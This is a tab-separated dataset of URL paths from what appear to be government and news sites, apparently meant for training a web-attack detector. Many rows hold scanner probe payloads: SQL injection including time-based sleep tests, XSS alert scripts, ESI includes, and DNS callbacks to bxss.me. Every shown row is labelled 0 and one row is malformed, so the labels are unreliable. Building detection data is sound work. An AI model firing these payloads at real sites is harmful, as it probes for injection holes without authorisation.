sentences	labels
newscenter/******/2020/11/27/javascript:void(); 	 0
newscenter/******/2021/09/07'"/><script>alert(775)</script>/013447361.shtml 	 0
zwgk/******/czzjzdjc/\"javascript:void(0)\" 	 0
was5/***/search?searchword=1&channelid=287219%' or 3851=3851 and '%%'='%&perpage=24&templet=1&token=1 	 0
qhly/******/2021/11/24/javascript:window.close(); 	 0
module/********/downfile.jsp?classid=0' and 9723=8406 and 'nkgr'='nkgr&filename=5e843683d0fe4948a646311bf154afc6.doc 	 0
vc/**/widgets/cookie'||'/jquery.cookie.js 	 0
ztzl/********/wzqh_gzbs/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 0
mall/****/goods.list.html?key=hi' or 'a'='a 	 0
gjcp/******/201411/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 0
system/********/interview/room.jsp?wbinterviewid=1033') or 3391=5655  	 0
brp/*****/tohome.z?editionmodelval=0'||(pg_sleep(8.0))||' 	 0
zwgk/******/ncwywfgz/if(now()=sysdate(),sleep(12),0)/plq/xmb_gzdxb.htm 	 0
swld/******/2021/10/15/javascript:window.close(); 	 0
jsearchfront/http://*******/t/fit.txt?.jpg/jcse/110105008056111/16/images/hanweb.css 	 0
index/******/2012/04/26/010753524_01.shtml 	 0
0'xor(if(now()=sysdate(),sleep(12),0))xor'z/********/js/ajax.js 	 0
aux/wp-content/*******/dzs-videogallery/admin/playlistseditor/popup.php?initer=whatava18642';alert(777)//645 	 0
vc/ui"" and 2*3*8=6*8 and ""7rea""=""7rea/***/easyui/plugins/jquery.parser.js 	 0
col/******/'""()&%<acx><script >jjtk(9014)</script>.html 	 0
en/***********/news/' and 'x'='y 	 0
jsearchfront/******/mainframe.do?begin=&end=&eq=&oq=&p=1&pg=1&pos=0""xor(if(now()=sysdate(),sleep(15),0))xor""z&pq=&q=请输入关键词&searchid=1&tpl=16&websiteid=110105008056111 	 0
qhly/******/2013/01/15/javascript:dozoom(9) 	 0
art'||'/****/10/12/art_31_242356.html 	 0
ddjs/****/" and "x"="y 	 0
zwgk/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/*******/gys/jyx.htm 	 0
was5/***/search?searchword=1&channelid=287219&perpage=24) and if(now()=sysdate(),sleep(0),0)/*'xor(if(now()=sysdate(),sleep(0),0))or'""xor(if(now()=sysdate(),sleep(0),0))or""*/&templet=1&token=1 	 0
com1/******/common/newaccount.aspx?email=alert(777) 	 0
newscenter/******/2015/09/07/011813664.shtml 	 0
zfld/******/"'><img src="/wf_xsrf1590.html">/013446963.shtml 	 0
was5/***/search?channelid=254846&searchword=?????? and 1>1 	 0
z/161208-1/*****/http://bxss.me/t/xss.html? 	 0
system/********/interview/room.jsp?wbinterviewid=1033%' and 1091=7963 and '%'='&owner=1707212448 	 0
newscenter/******/2021/11/23/javascript:window.close(); 	 0
socket.gethostbyname(""hitla"" ""rrwjekob50e43.bxss.me."")[3].to_s) ""/**/widgets/scrollup/css/themes/image.css 	 0
art"" and 2*3*8=6*8 and ""idak""=""idak/****/10/11/art_34_242318.html 	 0
lccp/********/javascript:void(0); 	 0
newscenter/****/javascript:window.close(); 	 0
zwgk/******/rsrm/0""xor(if(now()=sysdate(),sleep(12),0))xor""z.htm 	 0
zwxx/****/moon.php 	 0
gjcp/*****/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 0
vc/http://*******/t/fit.txt?.jpg.do 	 0
system/********/js/jquery/0""xor(if(now()=sysdate(),sleep(12),0))xor""z.js 	 0
index/******/2021/11/16/javascript:window.print() 	 0
was5/***/search?channelid=234439&orderby=relevance&perpage=24) and if(now()=sysdate(),sleep(0),0)/*'xor(if(now()=sysdate(),sleep(0),0))or'""xor(if(now()=sysdate(),sleep(0),0))or""*/&searchword=1 	 0
index/******/2021/11/22/javascript:window.close(); 	 0
was5/*****/default/install_plugin/dasdasdasdad?plugin=math2py&source=javascript:alert(777) 	 0
newscenter/******/2013/08/28/011173524_04.shtml 	 0
es/****/results.php?q='"--></style></script><script>alert(777)</script>&search=search&type=3 	 0
ldzc/****//xfs.bxss.me/t20200119_146666.html 	 0
index.php/*****/login/index.html?fromurl=st4r7s<d3v	onmouseover
qhly/******/2021/10/22/javascript:dozoom(9) 	 0
xwzx/****/mt16/ 	 0
index/****/js/data.js/""><script>alert(337)</script> 	 0
ywly/*****/index.html?continent=%' or 9906=8813  	 0
pic/***/003/109/ 	 0
newscenter/******/2021/11/17/javascript:window.close(); 	 0
module/*****/ckplayer/ckplayer.js/<img src="javascript:alert(559)">?_=1630311512775 	 0
aux//*******/switch/switch_mon.html?mode=plog-custom&mode-title=test</td><img width=1 height=1 src=/images/logo-mobility-controller.gif onload=alert(777)> 	 0
nbfw/*****/ostickrc/scp/tickets.php?a=export&h=9c2601b88c05055b51962b140f5121389&status=" onmouseover="alert(777)" 	 0
yqlj/****/tipsloginsubmit.action 	 0
was5/***/search/search?page=3';select pg_sleep(5)--&channelid=287219&searchword=1&keyword=1&orderby=-docreltime&perpage=7&outlinepage=10 	 0
swwj/******/2021/08/04/javascript:window.print() 	 0
2020zt/******/2020/08/04/javascript:window.print() 	 0
newscenter/******/2020/12/01/javascript:window.close(); 	 0
index/******/2021/01/07/javascript:void(); 	 0
2021zt/******/2021/06/09/013399706'""/><img src=javascript:alert(2309) .shtml 	 0
0'xor(if(now()=sysdate(),sleep(0),0))xor'z/****/bmleft.html 	 0
e/******/showinfo/?classid=11&id=10317'""()&%<acx><script >9wtx(9749)</script> 	 0
jsearchfront/**********/dimension.do?begin=&end=&eq=&oq=&p=1&pg=1&pos=&pq=&q=请输入关键词&searchid=0'xor(if(now()=sysdate(),sleep(15),0))xor'z&tpl=16&websiteid=110105008056111 	 0
gjcp/******/dialog/fck_spellerpages/spellerpages/server-scripts/spellchecker.php 	 0
jsearchfront/*******/jcse/110105008056111/16/images/hanweb.css 	 0
module/***/http://bxss.me/t/fit.txt?.jpg/theme/simple/css/jpage.css 	 0
inc/***/sources?resource=alert(/777/)&format=txt 	 0
jsearchfront/********/http://bxss.me/t/fit.txt?.jpg/110105008056111/16/images/plugin/selectpick/js.js 	 0
template/*****/ccmanage.php?find_enc=1&list=1"><script>alert(777)</script> 	 0
vc/**/widgets/http://bxss.me/t/fit.txt/jquery.cookie.js 	 0
wla/*********/comul_total.json.jsp?callback=jquery171030196352313975305_1632325579271') and 5637=5637 and '1'='1 	 0
newscenter/******/2021/12/05/javascript:void(0); 	 0
xwzx/**********/index.php?rt="><script>alert(777);</script>&s=your_admin"><script>alert(777);</script>&token=957bf7cb71078f4471807da1c42d721e"><script>alert(777);</script> 	 0
xxgk/******/" and "x"="y 	 0
0""xor(if(now()=sysdate(),sleep(12),0))xor""z/********/js/dynclicks.js 	 0
module/**********/visit.jsp/<img src="javascript:alert(5765)">?type=2&i_webid=1&i_columnid=11 	 0
jsearchfront/********/jcse/110105008056111/16/images//xfs.bxss.me/hotnews/js.js 	 0
newscenter/******/2020/04/05/javascript:window.close(); 	 0
ddjs/****/job/lib/ap_resume_intention.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects1) 	 0
zwgk'||'/******/bzxajgc.htm 	 0
zwgk/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/********/gys/bsj/zcwj.htm 	 0
qhly/******/2021/12/08/javascript:dozoom(14) 	 0
pic/*/00/36/17/361715_123833.png 	 0
zxgg/********/javascript:void(0); 	 0
was5/***/search?page=2&channelid=253477 and 7151=9841#&searchword=1&keyword=1&orderby=-docreltime&perpage=15&outlinepage=10 	 0
gygj/**********/index.php?limit="><script>alert(777);</script>&page=1"><script>alert(777);</script>&rt=product/special"><script>alert(777);</script>&sort="><script>alert(777);</script> 	 0
was5/wp-content/*******/dzs-videogallery/ajax.php?height=&source=6d27f""><script>alert(777)</script>894ba&type=&width= 	 0
es/****/xwygx/202109/t20210930_318020.html' and 'x'='x 	 0
newscenter/******/2021/11/05/javascript:void(0); 	 0
zwgk/http://*******/t/xss.html? 	 0
was5/***/search?searchword=1&channelid=287219&perpage=24%' or 8940=8940  	 0
zwgk/****/bmjs/zzqfyxt/plxrmfy/\"javascript:void(0)\" 	 0
module/********/downfile.jsp?classid=0&filename=187b8cf8c65b4c7e97230bf0e01cd0d4.xls and 5633=5633-- uyut 	 0
xwzx/********/javascript:void(0); 	 0
index/******/2020/07/28/javascript:void(); 	 0
2020zt/******/2020/10/16/javascript:window.print() 	 0
jsearchfront/********/jcse/110105008056111<esi:include src=""http://bxss.me/rpb.png""/>/16/images/searchbtn.js 	 0
if(now()=sysdate(),sleep(15),0)/*****/1088/1110/list.html 	 0
images"" and 2*3*8=6*8 and ""u3bu""=""u3bu/**/jquery.js 	 0
nul/wp-content/*******/dzs-videogallery/ajax.php?height=&source=6d27f""><script>alert(777)</script>894ba&type=&width= 	 0
xq/******/common/newaccount.aspx?ddlculture=alert(777) 	 0
system/********/interview/room.jsp?wbinterviewid=1033&owner=1707212448%' and 9814=0234 and '%%'='% 	 0
'""()&%<acx><script >iubl(9063)</script>/**/lib/easyui/themes/bootstrap/messager.css 	 0
ztpd/******/count/0036001/012000000000/window.location.href 	 0
zwgk/****/bmjs/zzqzfzcbmyzstsjg/zzqsthjt/\"javascript:void(0)\" 	 0
system/********/interview/room.jsp?wbinterviewid=1033&owner=1707212448%') or 9215=7103 and '%'=' 	 0
rlzy/****/javascript:stranbody(); 	 0
jsearchfront/********/jcse/bxss.me/16/images/ui.css 	 0
module/*****/ckplayer/ckplayer.js/"><script>alert(896)</script>?_=1630311635977 	 0
module/*****/if(now()=sysdate(),sleep(15),0)/urite.min.js 	 0
2016zt/****/" target="_blank"><img src="img3/7.jp 	 0
include/******/yunke.php 	 0
ywly/****/hjgc/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 0
news/******/65807.htm?rand=2 and 9160=9160-- cltx 	 0
news/********/silutouzi?page=_cloud_eye_trainer_56524eb847014a30f03212dadb9defb9 	 0
index/******/2021/12/18/javascript:window.close(); 	 0
zwgk/****/bmjs/qtdw/?wvstest=javascript:domxssexecutionsink(1,""'/""><xsstag>()locxss"")://javascript:domxssexecutionsink(1,""'/""><xsstag>()locxss"")httpjavascript:domxssexecutionsink(1,""'/""><xsstag>()locxss"") 	 0
zwgk/****/bmjs/zzqrdcwh/\"javascript:void(0)\" 	 0
index/******/2020/12/01/javascript:void(); 	 0
news/********/fengxianfangfan?page=1 and 2915=2915# 	 0
video/genixcms-master/genixcms-master/*******/index.php?page=posts&q=1'alert(777) 	 0
ztpd/******/api-getmodel-api-sql-sql=select concat(account,0x7a656e74616f636d735f73716c5f73716c69) from zt_user 	 0
com1/****/results.php?q='"--></style></script><script>alert(777)</script>&search=search&type=3 	 0
e/******/viewclick/?addclick=1&classid=1 waitfor delay '0:0:9.468' -- &id=174 	 0
2021zt/******/2021/09/13/javascript:window.print() 	 0
hqxx/********/e108109965.html 	 0
2016zt/******/2016/08/25/javascript:void(); 	 0
2017zt/******/2018/02/01/javascript:void(); 	 0
nul/**********/index.php?rt="><script>alert(777);</script>&s=your_admin"><script>alert(777);</script>&token=957bf7cb71078f4471807da1c42d721e"><script>alert(777);</script> 	 0
shzr/******/index.php?tid=default&lid=en_uk&f_email="">alert(777) 	 0
nul/****/"><script>alert(777)</script>show/title/time-for-a-heavy-harvest-new-release/src/@random4cd201e063d5c 	 0
newscenter/******/2021/09/07'""/><script>alert(758)</script>/013447361.shtml 	 0
templates/********/index.aspx?nodeid=394%';select sleep(5) 	 0
xwzx/****/jtwxq/202012/t20201201_264201.html and 1=1 	 0
2012zt/******/2012/05/30/010783070_01.shtml 	 0
jsearchfront/**********/dimension.do?begin=&end=&eq=&oq=&p=1&pg=if(now()=sysdate(),sleep(15),0)&pos=&pq=&q=请输入关键词&searchid=1&tpl=16&websiteid=110105008056111 	 0
2017zt/******/2018/01/20/javascript:window.close(); 	 0
pic/*/00/93/65/936587_952378.png 	 0
ldzc'""()&%<acx><script >aavn(9571)</script>/*****/sz/202108/t20210806_185416.html 	 0
gygj/****/" and "x"="y 	 0
jinronglicai/*******/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/2017-01-24/193.html 	 0
aux/**********/index.php?currency="><script>alert(777);</script>&product_id=109"><script>alert(777);</script>&rt=product/product 	 0
vc/**/lib/'""()&%<acx><script >vrou(9770)</script>/themes/bootstrap/linkbutton.css 	 0
was5/***/search?channelid=234439&orderby=relevance&perpage=24) and 4015=4015#&searchword=1 	 0
pic/*/11/37/70/11377077_964578.jpg 	 0
news/********/silulvyou?page='""()&%<acx><script >ydch(9090)</script> 	 0
2020zt/******/2020/07/31/javascript:window.print() 	 0
newscenter/******/2021/09/07/013447361'""/><img src=x onerror=alert(823)>.shtml 	 0
inc/****/magpierss/scripts/magpie_simple.php?url=""><img src= x onerror = alert(777)>url=""> 	 0
qywh/****/zrbg/ 	 0
public/*********/index/41730?did=4&period=3"">alert(/777/) 	 0
socket.gethostbyname(""hitxj"" ""smoajdhua2d6f.bxss.me."")[3].to_s) ""/********/jcse/110105008056111/16/images/plugin/analysis/jquery.windstagball.js 	 0
module/**********/visit.jsp/<img src="javascript:alert(2076)">?type=3&i_webid=1&i_columnid=392&i_articleid=192569 	 0
was5/***/search?searchword=-1 or 2295=2295#&channelid=287219&perpage=24&templet=1&token=1 	 0
xwdt/****/czjs/if(now()=sysdate(),sleep(12),0).htm 	 0
was5/*****/system.html?step=2&device=et"/><script>alert(777);</script>bh0 	 0
news/**************/canada 	 0
module/********/downfile.jsp?classid=0&filename=278851335f24465a9715e09ab5f36d60.docx and 4422=4422-- mbyg 	 0
vc/ui'||'/***/easyui/themes/bootstrap/panel.css 	 0
zwgk/****/bmyjs/zzqdwgzbmyxsjg/zzqdwbgt/\"javascript:void(0)\" 	 0
module/********/downfile.jsp?classid=0&filename=187b8cf8c65b4c7e97230bf0e01cd0d4.xls and 2277=4310 	 0
newscenter/******/2021/10/19/javascript:window.close(); 	 0
jsearchfront/template"" and 2*3*8=6*8 and ""1uam""=""1uam/****/110105008056111/16/images/common.js 	 0
ywly/*****/" and "x"="y 	 0
xxgk/*****/1088/1096/list.html?new=bxss.me 	 0
publish/*****/10596/25100/25123/2015/12/02/20151202100210095375683/javascript:; 	 0
'.gethostbyname(lc('hitrx'.'lqiqakzzfc6fe.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(99).chr(71).chr(111).chr(78).'/****/bmjs/gdyx/ 	 0
video/**********/index.php?currency="><script>alert(777);</script>&product_id=109"><script>alert(777);</script>&rt=product/product 	 0
2016zt/****/""><script>alert(34)</script> 	 0
jsearchfront/********/jcse/110105008056111/http://bxss.me/t/fit.txt?.jpg/images/plugin/waterpull/pinterest_grid.js 	 0
dcwj/*****/dash_additem.php?additem_form=alert(777); 	 0
bxss.me/******/fdzdgknr/qtfdxx/ 	 0
lz/******/2021/05/11/javascript:void(0); 	 0
jsearchfront/********/jcse/110105008056111/16/images/plugin/websitechange'||'/zwdt_v3.css 	 0
xwzx/****/2020_jtyw/202012/t20201222_268160.html' and 'x'='x 	 0
vc/ui'||'/*******/validity/validity.js 	 0
investors-garden/**********/graphic%' and 2*3*8=6*8 and 'q9jz'!='q9jz%/2020-02-27/8981.html 	 0
inc/****/calendar/agenda_list.php?type=personal' onmouseover='confirm(777)'/><!-- 	 0
ywly/*****/bmz/mxg/201412/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 0
cgi-bin/**********/index.php?limit="><script>alert(777);</script>&page=1"><script>alert(777);</script>&rt=product/special"><script>alert(777);</script>&sort="><script>alert(777);</script> 	 0
qhly/******/2008/10/19/javascript:window.print() 	 0
module/*****/ckplayer/ckplayer.js/<img src="javascript:alert(353)">?_=1630311371566 	 0
zwgk/******/fdzdgknr/qtfdxx/qzqd/202011/http://bxss.me/t/xss.html? 	 0
news/********/zixunfuwu?page=1 and 2648=2648# 	 0
'""()&%<acx><script >t5bf(9732)</script>/*/ 	 0
ldzc/****/swsj'||'/ 	 0
news/********/pinpaijianshe?page=*/-->'""></iframe></script></style></title></textarea><script >alert(03825)</script> 	 0
module/********/downfile.jsp?classid=0&filename=620cfd342eec49aab04f2e35c63427cf.docx') and 5309=5309 and ('mnwd'='mnwd 	 0
ztpd/******/wmjt/javascript:void(0); 	 0
ssjn/*******/t/xss.html? 	 0
2021zt/******/2021/06/09'"/><iframe src=javascript:alert(2331) /013399706.shtml 	 0
module/*****/ckplayer/ckplayer.js/"><script>alert(850)</script>?_=1630311617223 	 0
news/********/zijinqudao?page=1 and 4421=4421-- 	 0
zwgk/******/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/gys.htm 	 0
2021zt/******/2021/06/09'""/>/</script/>/<svg/onload=alert(2371) width=100//>/013399706.shtml 	 0
zwgk/******/ncwywfgz/ycs' and 2*3*8=6*8 and 'ycio'='ycio/hlx/xmb_gzdxb.htm 	 0
2016zt/******/2017/07/05/javascript:void(0); 	 0
rlzy/*******/moteur-prix.php?categoriemoteur=1"">alert(777); 	 0
socket.gethostbyname(""hitsi"" ""vqekvqfse01d8.bxss.me."")[3].to_s) ""/******/t20210806_185416.html 	 0
index/******/2021/11/09/javascript:window.close(); 	 0
jsearchfront/********/jcse/110105008056111/16/images/plugin/bxss.me/zwdt_v3.css 	 0
qhly/******/2017/02/17/javascript:dozoom(14) 	 0
template/******/common/signin.aspx?cbautosignin=""alert(777) 	 0
video/****/myspace/student.php?keyword=31337"" onmouseover=confirm(777)//&active=0&_qf__search_user=&submit=search 	 0
xwzx/****/api-getmodel-api-sql-sql=select concat(account,0x7a656e74616f636d735f73716c5f73716c69) from zt_user 	 0
lz/******/2020/08/21/javascript:void(0); 	 0
cpsms/********/javascript:void(0); 	 0
lz/******/2021/06/28/javascript:void(0); 	 0
xwzx/****/2021_mtgz/0""xor(if(now()=sysdate(),sleep(15),0))xor""z/t20210314_271326.html 	 0
ddjs/*************/ajax_managed_services.php 	 0
vc/ui'||'/***/easyui/themes/bootstrap/messager.css 	 0
module/*****/ckplayer/ckplayer.js/""><script>alert(590)</script>?_=1630311526105 	 0
xwzx/config-browser/showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
xxgk/*******/ybjsqzn'""()&%<acx><script >r8on(9899)</script>/list.html 	 0
module/*****/ckplayer/ckplayer.js/"><script>alert(3658)</script>?_=1630311991836 	 0
lz/******/2021/07/27/javascript:void(0); 	 0
bbs/******/<img src="javascript:alert(369)"> 	 0
if(now()=sysdate(),sleep(15),0)/****/2021_mtgz/202103/t20210314_271326.html 	 0
qhly/******/2016/03/29/javascript:window.print() 	 0
art/****/10/http://bxss.me/t/fit.txt/art_34_242318.html 	 0
index/******/2015/08/11/011788556.shtml 	 0
qhsw/******/2020/06/30/javascript:window.close(); 	 0
ywly/****/dlgc/javascript:stranbody(); 	 0
'""()&%<acx><script >ke7r(9230)</script>/********/jcse/110105008056111/16/images/result.css 	 0
was5/***/search?channelid=234439&orderby=relevance') and 5335=5335 and ('1'='1&perpage=24&searchword=1 	 0
socket.gethostbyname('hitqw' 'qynnbxhm93ba7.bxss.me.')[3].to_s) '/**/images/catesearchbtn.js 	 0
was5/***/search?channelid=253477&keyword=the' and 2*3*8=6*8 and 'mign'='mign&orderby=-docreltime&outlinepage=10&page=2&perpage=15&searchword=the 	 0
ztpd/wp-content/*******/dzs-videogallery/ajax.php?height=&source=6d27f""><script>alert(777)</script>894ba&type=&width= 	 0
kjcx/****/zjzj/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 0
lxwm/**********/index.php?currency="><script>alert(777);</script>&product_id=109"><script>alert(777);</script>&rt=product/product 	 0
es/****/spzx/201810/t20181012_194903.html' and 'x'='x 	 0
cn/**/info_37.aspx?itemid=1524' and 4819=4819 and 'wuej'='wuej 	 0
jsearchfront/template'""()&%<acx><script >efoq(9521)</script>/****/110105008056111/16/images/hanweb.css 	 0
xxgk/*****/bxss.me/1105/list.html 	 0
index/****/qhxwkhd.shtml/"><script>alert(106)</script> 	 0
xxgk/"".gethostbyname(lc(""hitlq"".""apnbkpqu6333f.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(114).chr(86).chr(107).chr(78).""/***/zfxxgkml_2127/jytabljg_2061/list.html 	 0
2021zt/******/2021/02/22/javascript:void(); 	 0
socket.gethostbyname(""hitaj"" ""hnwgpuosb9993.bxss.me."")[3].to_s) ""/**/images/plugin/voice/hzrecorder.js 	 0
ldzc/****/202001/t20200119_/xfs.bxss.me.html 	 0
zwgk/****/bmyjs/zzqfyxt/szsszjrmfy/201903/encodeuricomponent(window.location.href) 	 0
zwgk/****/bmjs/http://bxss.me/t/fit.txt/ 	 0
was5/***/search?channelid=254846&searchword=天津') and 9086=(select 9086 from pg_sleep(5)) and ('kjbi'='kjbi 	 0
newscenter/******/2021/12/15/javascript:void(); 	 0
spzq/********/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 0
ztzl/config-browser/showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
xwzx/*******/index.php?pagename=</script><script>alert(777)</script><!-- 	 0
fxgg/********/javascript:void(0); 	 0
jsearchfront/**********/dimension.do?cateid=1&eq=&oq=&p=1&pg=15&pos=&pq=&q=请输入关键词&ranksign=&searchid=1'""()&%<acx><script >dr2p(9199)</script>&total=&tpl=16&websiteid=110105008056111 	 0
xxgk/*****/1088/1095/list.html?new=0.12735219527013664<esi:include src=""http://bxss.me/rpb.png""/> 	 0
newscenter/******/2021/12/19/javascript:void(0); 	 0
zfld/******/2021/11/05/javascript:window.close(); 	 0
system/********/interview/room.jsp?wbinterviewid=1033' and 3953=3818 and '1'='1&owner=1707212448 	 0
module/*****/ckplayer/ckplayer.js/<img src="javascript:alert(6765)">?_=1630312437488 	 0
lz/******/2021/11/15/javascript:void(0); 	 0
yqlj/******/common/newaccount.aspx?email=alert(777) 	 0
qywh/*******/moteur-prix.php?categoriemoteur=1"">alert(777); 	 0
jsearchfront"" and 2*3*8=6*8 and ""pmc2""=""pmc2/********/jcse/110105008056111/16/images/view.js 	 0
investors-garden%' and 2*3*8=6*8 and 'ydyr'!='ydyr%/**********/graphic/2020-02-27/8981.html 	 0
newscenter/******/2021/11/30/javascript:window.print() 	 0
fxgg/********/javascript:void(0); 	 0
fr/*****/index.php?step=admin_member_display&search_field=all&keyword=<script>alert(777)</script>&cmd_button=search user 	 0
xwzx/****/202009/t20200915_253522.html' and 'x'='x 	 0
zwxx_11337/****/202108/encodeuricomponent(window.location.href) 	 0
zwxx_11337/****/202007/encodeuricomponent(window.location.href) 	 0
jsearchfront/*******/jcse/110105008056111/16/images/jquery.waterfall.js 	 0
fr/******/common/signin.aspx?cbautosignin=""alert(777) 	 0
index/******/2020/05/04/javascript:void(); 	 0
module/*****/ckplayer/ckplayer.js/<img src="javascript:alert(372)">?_=1630311380750 	 0
index/******/2020/08/04/javascript:window.print() 	 0
index/******/2021/10/02/javascript:void(0); 	 0
zwgk/zdlygk%' and 2*3*8=6*8 and 'ma2k'!='ma2k%/********/wzs/qtxs/xmb_gzdxb.htm 	 0
jsearchfront/********/jcse/110105008056111/16/images/plugin/bxss.me/pinterest_grid.js 	 0
was5/***/search?searchword=1&channelid=287219&perpage=-1 or 9111=6314#&templet=1&token=1 	 0
was5/***/search?channelid=299868&perpage=1000') and 1844=1844  	 0
z/210909-'""()&%<acx><script >9hvh(9102)</script>/*****/d00139fee967b9a5c83cbe1cd7e911f8.css 	 0
zxgg/********/javascript:void(0); 	 0
index/******/2020/10/14/javascript:window.close(); 	 0
module/***/rssfeed.jsp?colid=34' and 5511=5511 and 'ezaf'='ezaf 	 0
zwgk/******/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/gys/jyx.htm 	 0
module/********/downfile.jsp?classid=0' and 3223=3223 and 'lhuj'='lhuj&filename=f8c2ed3e25ea4c269bf2e627a90b568a.docx 	 0
index/******/2010/05/25/010129335.shtml 	 0
zwgk/******/ncwywfgz/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/hlx/xmb_gzdxb.htm 	 0
info/****/document.location.href 	 0
lz/****/javascript:void(0); 	 0
js/*******/gvideos.php?gid=1 and 1=1 	 0
zmhd/*****/hfswsj/'.gethostbyname(lc('hithn'.'fjdxhssdbd351.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(105).chr(75).chr(102).chr(84).'/t20210906_186411.html 	 0
vc/**/lib<esi:include src=""http://bxss.me/rpb.png""/>/security/sm2.js 	 0
news/********/silumaoyi?page=1</script><script>4dq6(9831)</script> 	 0
jsearchfront<esi:include src=""http://*******/rpb.png""/>/template/jcse/110105008056111/16/images/hanweb.css 	 0
jsearchfront/********/jcse/110105008056111/16/images'||'/plugin/websitechange/zwdt_v3.css 	 0
outurl/****/job/lib/ap_resume_workcity.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects1) 	 0
gg'||'/*****/index.html 	 0
system/resource' and 2*3*8=6*8 and 'rkpm'='rkpm/**/image/imagescroll.js 	 0
en/***********/tradeandservices/ 	 0
zwgk/******/bzxajgc/0'xor(if(now()=sysdate(),sleep(12),0))xor'z.htm 	 0
was5/***/search?perpage=20&outlinepage=10&keyword=1)); waitfor delay '0:0:2&channelid=240998&searchword=1&page=10 	 0
lz/******/2021/04/22/javascript:void(0); 	 0
zmhd/*****/hfswsj/202109/'.gethostbyname(lc('hitsl'.'rgcsmdld45d3d.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(100).chr(86).chr(121).chr(77).'_186411.html 	 0
ywzzq/*********/jsp/ccmr/clientportal/login.jsp?strmessage=<img src=/ onerror="alert(777)"/> 	 0
wla/*********/daily_clickcount.json.jsp?callback=jquery171030196352313975305_1632325579270' and 2035=2035 and '1'='1 	 0
socket.gethostbyname(""hitwp"" ""cmjbbqhpe424a.bxss.me."")[3].to_s) ""/****/ 	 0
xwzx/************/index?search="">alert(/777/) 	 0
com1/*********/rest/threatfeeds/pagedjson?namepattern=&page=0&size=25&sortcol=address&sortdir="/><script>alert(777)</script> 	 0
outurl/******/common/newaccount.aspx?ddlculture=alert(777) 	 0
vc/**/widgets/validity/validity' and 2*3*8=6*8 and '8stv'='8stv.js 	 0
xxgk/******/202011/t20201113_255857.html' and 'x'='y 	 0
was5/***/search?page=2&channelid=253477 and 0012=5204--&searchword=1&keyword=1&orderby=-docreltime&perpage=15&outlinepage=10 	 0
qt/********/index.html?channelid=295157&searchword=0""xor(if(now()=sysdate(),sleep(15),0))xor""z 	 0
icons/genixcms-master/genixcms-master/*******/index.php?page=posts&q=1'alert(777) 	 0
zwgk/****/bmjs//xfs.bxss.me/ 	 0
zwgk/******/ 	 0
socket.gethostbyname(""hitgv"" ""atyepoqcfb626.bxss.me."")[3].to_s) ""/****/list.html 	 0
newscenter/******/2012/11/05/010943027_03.shtml 	 0
en/**************/csrreports/201908/t20190828_222708.html' and 'x'='y 	 0
news/********/silumaoyi?page=1 and 5282=8325-- 	 0
col/*****/bxss.me.html 	 0
module/**********/visit.jsp?i_columnid[0]==2and 3 in &i_columnid[1]=convert(int,sys.fn_sqlvarbasetostr(hashbytes('md5','1074475338')))&i_webid=1&type=1 	 0
qt/****/index.html 	 0
shzr/*****/ and 1=1 	 0
script/*/http://bxss.me/t/fit.txt?.jpg.js 	 0
system/********/code/datainput.jsp?owner=' or 8062=8062 and '1'='1 	 0
cgi-bin/*********/admin/notificationpopup.php?new=1&type=cr&height=alert(777) 	 0
news/********/zijinqudao 	 0
z/****/admin/course_category.php?action=add&category=""/><script>confirm(777)</script> 	 0
